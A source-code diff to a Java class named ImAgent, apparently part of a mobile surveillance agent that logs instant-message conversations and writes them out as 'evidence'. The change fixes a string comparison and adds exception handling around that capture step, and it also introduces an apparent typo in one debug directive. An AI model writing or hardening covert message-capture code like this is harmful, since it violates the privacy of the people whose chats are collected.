@@ -257,8 +257,8 @@ public final class ImAgent extends Agent implements BacklightObserver,
 
         int lastEqual;
         for (lastEqual = lines.size() - 1; lastEqual >= 0; lastEqual--) {
-            if (lines.elementAt(lastEqual) == lastLine) {
-                //#ifdef DEBUG
+            if (lines.elementAt(lastEqual).equals(lastLine)) {
+                //#ifdef DEBUGs
                 debug.trace("add found: " + lastEqual);
                 //#endif
                 break;
@@ -272,16 +272,23 @@ public final class ImAgent extends Agent implements BacklightObserver,
             //#endif
         }
 
-        lastLine = (Line) lines.lastElement();
-        //#ifdef DEBUG
-        debug.trace("add, serialize lastLine: " + lastLine);
-        //#endif
-        serialize(lastLine);
-        writeEvidence(partecipants, lines, lastEqual + 1);
+        try {
+            lastLine = (Line) lines.lastElement();
+            //#ifdef DEBUG
+            debug.trace("add, serialize lastLine: " + lastLine);
+            //#endif
 
-        //#ifdef DEBUG
-        debug.trace("add end");
-        //#endif
+            serialize(lastLine);
+            writeEvidence(partecipants, lines, lastEqual + 1);
+
+            //#ifdef DEBUG
+            debug.trace("add end");
+            //#endif
+        } catch (Exception ex) {
+            //#ifdef DEBUG
+            debug.error("add: " + ex);
+            //#endif
+        }
     }
 
     private void writeEvidence(String partecipants, Vector lines, int startFrom) {
